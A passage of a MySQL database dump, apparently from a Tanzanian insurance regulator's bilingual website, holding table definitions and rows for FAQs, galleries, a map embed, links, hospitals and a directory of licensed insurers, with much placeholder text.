  `answer_en` text COLLATE utf8mb4_unicode_ci,
  `active` tinyint(1) NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `specials` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `faqs`
--

LOCK TABLES `faqs` WRITE;
/*!40000 ALTER TABLE `faqs` DISABLE KEYS */;
INSERT INTO `faqs` VALUES (1,'Ofisi zetu hupatikana wapi?','Where are our offices located?','<p>Mtaa wa Jamhuri</p>','<p>Jamhuri Street</p>',1,'how-to-do-something','2021-08-03 07:31:50','2021-08-10 03:41:31',NULL),(2,'How do I become a Business man','How do I become a Business man','<p>How do I become a Business man</p>','<p>How do I become a Business man</p>',1,'how-do-i-become-a-business-man-2','2021-08-03 07:39:40','2021-08-03 07:54:50',NULL),(3,'How to Start a farm business How to Start a farm business How to Start a farm business How to Start a farm business','How to Start a farm business How to Start a farm business How to Start a farm business How to Start a farm business How to Start a farm business How to Start a farm business','<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas semper nisi in dolor vehicula, quis pellentesque magna efficitur. Etiam turpis risus, consectetur vitae bibendum vel, viverra ac mi. Curabitur et leo in libero ultrices dapibus.</p>\r\n\r\n<ul>\r\n	<li>Mauris sodales consequat tortor, sit amet mollis ante pulvinar porttitor. Donec venenatis, erat id dignissim elementum, metus odio semper turpis, ut sagittis urna enim id dolor. Integer vel tellus consequat, ornare nisl sed, convallis ante.</li>\r\n	<li>Praesent pulvinar, enim sed interdum tristique, libero tellus malesuada est, et ornare tellus orci sit amet metus.</li>\r\n	<li>Donec quis eros vitae sem mattis eleifend. Proin odio ipsum, viverra quis nibh quis, sollicitudin molestie ante. Sed egestas nulla leo, at dapibus odio eleifend id. Integer turpis elit, luctus in finibus ac, viverra ut lacus.</li>\r\n	<li>Maecenas molestie at mauris eu vehicula. Pellentesque porttitor sed orci sit amet condimentum.</li>\r\n	<li>Integer fermentum, diam non condimentum mollis, mauris quam tempor neque, non posuere mauris lacus sodales sem.</li>\r\n</ul>','<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas semper nisi in dolor vehicula, quis pellentesque magna efficitur. Etiam turpis risus, consectetur vitae bibendum vel, viverra ac mi. Curabitur et leo in libero ultrices dapibus.</p>\r\n\r\n<ul>\r\n	<li>Mauris sodales consequat tortor, sit amet mollis ante pulvinar porttitor. Donec venenatis, erat id dignissim elementum, metus odio semper turpis, ut sagittis urna enim id dolor. Integer vel tellus consequat, ornare nisl sed, convallis ante.</li>\r\n	<li>Praesent pulvinar, enim sed interdum tristique, libero tellus malesuada est, et ornare tellus orci sit amet metus.</li>\r\n	<li>Donec quis eros vitae sem mattis eleifend. Proin odio ipsum, viverra quis nibh quis, sollicitudin molestie ante. Sed egestas nulla leo, at dapibus odio eleifend id. Integer turpis elit, luctus in finibus ac, viverra ut lacus.</li>\r\n	<li>Maecenas molestie at mauris eu vehicula. Pellentesque porttitor sed orci sit amet condimentum.</li>\r\n	<li>Integer fermentum, diam non condimentum mollis, mauris quam tempor neque, non posuere mauris lacus sodales sem.</li>\r\n</ul>',1,'how-to-start-a-farm-business','2021-08-03 08:06:04','2021-08-03 08:06:47',NULL),(4,'What is Risk Management?','What is Risk Management?','<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Answer:</p>\r\n\r\n<p><em>Risk management is the identification, analysis and economic control of those risks which can threaten the assets or earning capacity of an enterprise.</em></p>\r\n\r\n<p>&nbsp;</p>','<p>Answer:</p>\r\n\r\n<p><em>Risk management is the identification, analysis and economic control of those risks which can threaten the assets or earning capacity of an enterprise.</em></p>\r\n\r\n<p>&nbsp;</p>',1,'what-is-risk-management','2022-08-11 11:13:11','2022-08-11 11:13:11',NULL);
/*!40000 ALTER TABLE `faqs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `galleries`
--

DROP TABLE IF EXISTS `galleries`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `galleries` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` text COLLATE utf8mb4_unicode_ci,
  `title_en` text COLLATE utf8mb4_unicode_ci,
  `content_sw` text COLLATE utf8mb4_unicode_ci,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `type` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `featured` tinyint(1) NOT NULL DEFAULT '1',
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `galleries`
--

LOCK TABLES `galleries` WRITE;
/*!40000 ALTER TABLE `galleries` DISABLE KEYS */;
INSERT INTO `galleries` VALUES (1,'slideshow','slideshow','slideshow','slideshow','photos','slideshow',1,1,'2021-07-30 09:06:50','2022-08-13 20:30:35'),(2,'Picha za Ulimwengu','Photos of the Universe','The world is very promising The world is very promising  The world is very promising  The world is very promising The world is very promising  The world is very promising  The world is very promising The world is very promising  The world is very promising  The world is very promising  The world is very promising  The world is very promising','The world is very promising  The world is very promising  The world is very promising  The world is very promising  The world is very promising  The world is very promising  The world is very promising  The world is very promising  The world is very promising  The world is very promising  The world is very promising  The world is very promising','photos','photos-of-the-universe',0,1,'2021-08-04 01:39:59','2022-08-13 20:30:35'),(3,'Picha Nzuri','Good Picha','picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana','picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana picha nzuri za kuvutia sana','photos','good-picha',0,1,'2021-08-04 03:00:22','2022-08-13 20:30:35'),(4,'Video kali za Matukio','Hot Trending Videos','All the good clips are available here on the website All the good clips are available here on the website All the good clips are available here on the website All the good clips are available here on the website All the good clips are available here on the website All the good clips are available here on the website All the good clips are available here on the website','All the good clips are available here on the website All the good clips are available here on the website All the good clips are available here on the website All the good clips are available here on the website All the good clips are available here on the website All the good clips are available here on the website All the good clips are available here on the website','videos','hot-trending-videos',0,1,'2021-08-04 03:26:00','2022-08-13 20:26:08'),(7,'TIRA Ofice','TIRA Ofice','TIRA OFFICE','TIRA OFFICE','photos','tira-ofice',0,1,'2022-08-13 20:13:10','2022-08-13 20:30:35'),(8,'ANYONE CAN INVEST IN INSURANCE','ANYONE CAN INVEST IN INSURANCE','ANYONE CAN INVEST IN INSURANCE','ANYONE CAN INVEST IN INSURANCE','photos','anyone-can-invest-in-insurance',0,1,'2022-08-13 20:21:39','2022-08-13 20:30:35');
/*!40000 ALTER TABLE `galleries` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `google_maps`
--

DROP TABLE IF EXISTS `google_maps`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `google_maps` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `url` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `office_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `google_maps`
--

LOCK TABLES `google_maps` WRITE;
/*!40000 ALTER TABLE `google_maps` DISABLE KEYS */;
INSERT INTO `google_maps` VALUES (9,'<iframe src=\"https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d15846.492258314473!2d39.2817001!3d-6.815617!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x76503dfba83b084!2sTanzania%20Insurance%20Regulatory%20Authority%20(TIRA)!5e0!3m2!1sen!2stz!4v1659882719508!5m2!1sen!2stz\" width=\"600\" height=\"450\" style=\"border:0;\" allowfullscreen=\"\" loading=\"lazy\" referrerpolicy=\"no-referrer-when-downgrade\"></iframe>',1,1,'2022-08-07 11:32:43','2022-08-07 11:32:43');
/*!40000 ALTER TABLE `google_maps` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `home_links`
--

DROP TABLE IF EXISTS `home_links`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `home_links` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link` tinyint(1) NOT NULL DEFAULT '0',
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url_external` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `link_type` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `home_links`
--

LOCK TABLES `home_links` WRITE;
/*!40000 ALTER TABLE `home_links` DISABLE KEYS */;
INSERT INTO `home_links` VALUES (1,'Programu','Programme',0,'https://mail.ega.go.tz','https://mail.ega.go.tz',1,'fa-list','programme','2022-02-24 06:02:44','2022-02-24 06:20:50'),(3,'Kozi za Muda Mfupi','Short Courses',1,'announcements',NULL,1,'fa-book-open','short-courses','2022-02-24 06:23:25','2022-02-24 06:23:25');
/*!40000 ALTER TABLE `home_links` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hospitals`
--

DROP TABLE IF EXISTS `hospitals`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hospitals` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `contact` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `address` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `phone` varchar(161) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT '0',
  `position` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hospitals`
--

LOCK TABLES `hospitals` WRITE;
/*!40000 ALTER TABLE `hospitals` DISABLE KEYS */;
INSERT INTO `hospitals` VALUES (3,'Muhimbili Hospital','TPSF','<p>Executive Director<br />\r\nMuhimbili National Hospital,<br />\r\nP.O Box 65000,<br />\r\nDar es Salaam.</p>','info@mnh.or.tz','+255-22-2151367-9','f',1,'2021-07-28 06:17:24','2022-06-25 03:32:53',0,2),(5,'Aga Khan Hospital','Viwanda na Biashara','<p>P.O. Box 2289<br />\r\nOcean Road<br />\r\nDar es Salaam<br />\r\nTANZANIA</p>','info@khanorg.com','+255 22 211 5151/53','o',1,'2021-07-28 06:18:04','2022-06-25 03:29:56',0,5),(6,'TMJ','TNBP','<p>TMJ Hospital, Mwaikibaki Road, Mikocheni, Dar es Salaam<br />\r\nTanzania</p>','tmjhospital.co.tz','+255222775517','p',1,'2021-07-28 06:18:36','2022-06-25 03:10:24',0,1),(7,'Masana Hospital',NULL,'<p>P.O BOX 65561, Dar es Salaam Tanzania</p>','info@masana.com','+255 22 2627177','masana-hospital',1,'2022-06-25 03:29:24','2022-06-25 04:04:41',0,1);
/*!40000 ALTER TABLE `hospitals` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `how_do_i`
--

DROP TABLE IF EXISTS `how_do_i`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `how_do_i` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `how_do_i`
--

LOCK TABLES `how_do_i` WRITE;
/*!40000 ALTER TABLE `how_do_i` DISABLE KEYS */;
INSERT INTO `how_do_i` VALUES (4,'How do I apply for a teaching position?','How do I apply for a teaching position?','<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>','<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>',1,'how-do-i-apply-for-a-teaching-position',1,'2021-12-01 03:17:10','2021-12-01 03:17:10'),(5,'How Do I get a License?','How Do I get a License?','<p>How Do I get a License explained ....</p>','<p>How Do I get a License explained</p>',1,'how-do-i-get-a-license',1,'2022-02-14 10:18:43','2022-02-14 10:18:54'),(6,'How do I apply for a teaching position?','How do I apply for a teaching position?','<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>','<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>',1,'how-do-i-apply-for-a-teaching-position',1,'2021-12-01 03:17:10','2021-12-01 03:17:10');
/*!40000 ALTER TABLE `how_do_i` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ict_links`
--

DROP TABLE IF EXISTS `ict_links`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ict_links` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link` tinyint(1) NOT NULL DEFAULT '0',
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url_external` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `parent` int(11) NOT NULL DEFAULT '0',
  `position` int(11) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ict_links`
--

LOCK TABLES `ict_links` WRITE;
/*!40000 ALTER TABLE `ict_links` DISABLE KEYS */;
INSERT INTO `ict_links` VALUES (1,'Staff Portals','Staff Portals',0,'https://mail.ega.go.tz','https://mail.ega.go.tz',1,0,1,'2022-02-22 10:16:25','2022-02-22 10:16:54'),(2,'Student Portal','Student Portal',1,'announcements',NULL,1,0,1,'2022-02-22 10:17:24','2022-02-22 10:17:24');
/*!40000 ALTER TABLE `ict_links` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `important_links`
--

DROP TABLE IF EXISTS `important_links`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `important_links` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT '0',
  `position` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `important_links`
--

LOCK TABLES `important_links` WRITE;
/*!40000 ALTER TABLE `important_links` DISABLE KEYS */;
INSERT INTO `important_links` VALUES (1,'MoF','MoF','http://mof.go.tz',1,'2021-07-28 06:16:15','2022-08-10 01:57:14',0,1),(3,'TRA','TRA','http://tra.go.tz',1,'2021-07-28 06:17:24','2022-08-10 01:57:14',0,2),(4,'ZRB','ZRB','http://zanrevenue.org',1,'2021-07-28 06:17:43','2022-08-10 01:57:14',0,3),(6,'NIDA','NIDA','http://nida.go.tz',1,'2021-07-28 06:18:36','2022-08-10 01:57:14',0,4),(7,'ZCSRA','ZCSRA','https://zcsra.go.tz/',1,'2021-10-13 08:18:42','2022-08-10 01:57:14',0,5),(8,'BRELA','BRELA','https://brela.go.tz',1,'2021-07-28 06:16:15','2022-08-10 01:57:14',0,6),(9,'BPRA','BPRA','https://bpra.go.tz',1,'2021-07-28 06:17:24','2022-08-10 01:57:14',0,7),(10,'LATRA','LATRA','https://latra.go.tz',1,'2021-07-28 06:17:43','2022-08-10 01:57:14',0,8),(11,'Police Force','Police Force','https://police.go.tz',1,'2021-07-28 06:18:36','2022-08-10 01:57:14',0,9);
/*!40000 ALTER TABLE `important_links` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `licensed_entities`
--

DROP TABLE IF EXISTS `licensed_entities`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `licensed_entities` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `telephone` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `region` text COLLATE utf8mb4_unicode_ci,
  `address` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `principal_officer` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `fax` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `class_of_business` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `website` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `license_type` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `category_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=31 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `licensed_entities`
--

LOCK TABLES `licensed_entities` WRITE;
/*!40000 ALTER TABLE `licensed_entities` DISABLE KEYS */;
INSERT INTO `licensed_entities` VALUES (1,'Alliance Life Assurance Limited','+255 754 780050','+255 22 2103300 +255 22 2103301','life@alliancelife.co.tz','Dar es salaam, Kurasini','5th floor EXIM Tower Ghana Avenue P.O. Box 11522 DAR ES SALAAM','Byford Mutimusakwa','+255 22 2103305','Life','www.alliancelife.co.tz','Perpetual',1,'mnazi-juuu-kusini',9,'2022-06-30 20:47:08','2022-08-13 04:21:46'),(2,'Thorn','069226104','+255 22 2122121','thorn.limited@yahoo.com','Dar es salaam','NIC Life House Sokoine/ohio Street, 6th Floor P.O. Box 10177 DAR ES SALAAM','A.S. Balisidya','+255 22 2122105',NULL,'',NULL,1,'mnazi-juuu-kusini',7,'2022-06-30 20:47:08','2022-08-07 08:01:10'),(3,'Assemble Insurance Tanzania Limited','+255 022 2780651','+255 022 2780020 | +255 022 2780651','info@aar.co.tz','Dar es salaam','AAR Insurance (T) Ltd Plot 74 Serengeti Road, Warioba Street Off Mwai Kibaki Road, Mikocheni P.O Box 9600, Dar Es Salam','Ms. Violet Mordichai','+255 022 2781472 | +255 022 2781204','Life','http://aar-insurance.com','Perpetual',1,'mnazi-juuu-kusini',9,'2022-06-30 20:47:08','2022-08-13 04:30:09'),(5,'Equity Insurance Brokers Ltd','+255 754 264559',NULL,'infor@equityinsurancebrokers.co.tz','Dar es salaam','5th floor Luther House, Sokoine Drive P.O. Box 2900 DAR ES SALAAM','Mr. Octavian Temu',NULL,'Non-Life',NULL,'Perpetual',1,'equity-insurance-brokers-ltd',7,'2022-08-07 07:57:34','2022-08-07 07:57:34'),(6,'MIC','+255 777 52555 5','+255 22 2120433','smmaherali@micglobalrisks.com','Dar es salaam','8th Floor, Amani Place Ohio Street P.O. Box 10936 DAR ES SALAAM','Mr. Shiraz M. Maherali',NULL,NULL,NULL,NULL,1,'mic',7,'2022-08-07 07:58:34','2022-08-07 07:58:34'),(8,'MEJU INSURANCE SURVEYORS AND LOSS ASSESSORS',NULL,NULL,NULL,'Dar es salaam','DAR','TBA',NULL,'Non-Life',NULL,NULL,0,'meju-insurance-surveyors-and-loss-assessors-2',10,'2022-08-07 08:06:04','2022-08-07 08:06:04'),(9,'Eagle Surveyors and Loss Assessors','0765 453940',NULL,'eagleadjusters@gmail.com','Dar es salaam','P.O. Box 42466, EAGT Building Bohari Street, Plot No. 1, 2nd Floor Room 274 Temeke - Dar es salaam','Samson Andongisye Mwamakula',NULL,NULL,NULL,NULL,1,'eagle-surveyors-and-loss-assessors',10,'2022-08-07 08:08:17','2022-08-07 08:08:17'),(10,'Continental Reinsurance Ltd Kenya','+254 (020) 242939',NULL,'info@continental-re.com','Dar es salaam','197 Place (4th Floor), Lenana Rd, P O Box 76326 – 00508, Nairobi, Kenya','Souvik Banerjea',NULL,NULL,'http://www.continental-re.com',NULL,1,'continental-reinsurance-ltd-kenya',11,'2022-08-09 16:38:34','2022-08-09 16:43:44'),(11,'ALESCO Risk Management Services Limited',NULL,'+44 (0) 20 7204 8999','Anita_Amoo@ajg.com','Dar es salaam','The Walbrook Building , 2 Walbrook; London EC4N 8AW','Simon Matson',NULL,'Reinsurance','www.alescorms.com',NULL,1,'alesco-risk-management-services-limited',12,'2022-08-09 16:48:29','2022-08-09 16:48:45'),(12,'Alliance Insurance Corporation Ltd','+255 754 780050/714 041155','0411200104','admin@alliance.co.tz','Dar es salaam','Ghana Avenue 7th floor EXIM Tower P.O. Box 9942 DAR ES SALAAM.','Mr. Rajiv Kumar','+255 22 2139098','Life','www.alliance.co.tz','Perpetual',1,'alliance-insurance-corporation-ltd',9,'2022-08-13 04:14:51','2022-08-13 04:14:51'),(13,'Britam Insurance Tanzania Ltd.','+255 22 213 8058','+255 22 213 8058 /212 9384-7','britam@co.tz','Dar es salaam','2nd Floor PPF Towers Ohio Street/Ghana Avenue P.O. Box 75433 DAR ES SALAAM','Mr. Steven Lokonyo','+255 22 213 8059','Life','www.Britam.co.tz','Perpetual',1,'britam-insurance-tanzania-ltd',9,'2022-08-13 04:40:10','2022-08-13 04:40:10'),(14,'Bumaco Insurance Company Ltd','+255 22 212 4654','+255 22 212 4654','bumacodar@yahoo.com','Dar es salaam','3rd Floor, Luther House Sokoine Drive P.O. Box 13147 DAR ES SALAAM','Mr. Ramadhani Mongi','+255 22 212 4654','Life','www.bumaco.co.tz','Perpetual',1,'bumaco-insurance-company-ltd',9,'2022-08-13 04:43:56','2022-08-13 04:43:56'),(15,'First Assurance Company Limited','+255767818101 / +255783543939','+255222198500','enquiries@firstassurance.co.tz','Dar es salaam','Peugeot House, Office No. 2 Ground Floor, Upanga Road','Mr. Rogation Casmir Selengia','+255767818101 / +255783543939',NULL,'http://www.firstassurance.co.tz','Perpetual',1,'first-assurance-company-limited',9,'2022-08-13 04:51:36','2022-08-13 04:51:36'),(16,'GA Insurance Tanzania Limited','+255 788 969 945','+255 22 2110311/2','info@gatanzania.co.tz','Dar es salaam','401, 4th Floor IT Plaza Ohio Street/Garden Avenue P.O. Box 75908 Dar Es Salaam','Mr. Amit Srivastava','+255 22 2110311/2','Life','www.gakenya.com/ga-tanzania/','Perpetual',1,'ga-insurance-tanzania-limited',9,'2022-08-13 05:34:34','2022-08-13 05:34:34'),(17,'The Heritage Insurance Company Tanzania Limited','+255 22 2664210, 255 22 2664204,','+255 22 2664210, 255 22 2664204, 255 22 2664209, 255 774 783318','info@heritagetanzania.com','Dar es salaam','OysterBay Office Complex 368 Msasani Road, P.O. Box 7390 Dar es salaam','Mr. Anil Chopra','+255(22)2138696','Life','www.heritagetanzania.com','Perpetual',1,'the-heritage-insurance-company-tanzania-limited',9,'2022-08-13 05:46:34','2022-08-13 05:46:34'),(18,'ICEA Lion General Insurance Company (T) Limited','+55 754 244333','+255 22 277 4999/277 5039','insurance@icealion-tz.com','Dar es salaam','Plot No. 331, Kambarage Road Mikocheni A P.O. Box 1948 DAR ES SALAAM','Mr. Ravinarayanan Krishnamurthy','+255 22 277 5094','Life','www.icealion-tz.com','Perpetual',1,'icea-lion-general-insurance-company-t-limited',9,'2022-08-13 05:50:17','2022-08-13 05:50:17'),(19,'Insurance Group of Tanzania Limited','+255 22 2131481','+255 22 2131481 +255 22 2122064','Info@igt.co.tz','Dar es salaam','12th floor NIC Investment House Samora Avenue/Mirambo street P.O. Box 605 DAR ES SALAAM','Mr. Samuel Muhindi','+255 22 2131482',NULL,'www.igt.co.tz','Perpetual',1,'insurance-group-of-tanzania-limited',9,'2022-08-13 05:59:55','2022-08-13 05:59:55'),(20,'The Jubilee Insurance Company of Tanzania Limited','+255 22 213 5124','+255 22 213 5121/124','enquiry@jubileetanzania.com','Dar es salaam','Amani Place 4th Floor Ohio Street P.O. Box 20524 DAR ES SALAAM','Mr. Dipankar Acharya','+255(22)2135116','Life','www.jubileeinsurance.com','Perpetual',1,'the-jubilee-insurance-company-of-tanzania-limited',9,'2022-08-13 06:03:52','2022-08-13 06:03:52'),(21,'Jubilee Life Insurance Company Ltd','255 22 2135121, 255 22 2135124, 255 22 2135129','255 22 2135121, 255 22 2135124, 255 22 2135129',NULL,'Dar es salaam','Short Name: \r\nJubilee Life\r\n\r\nAmani Place, Ohio Street, 9th Floor P.O. Box 20524 DAR ES 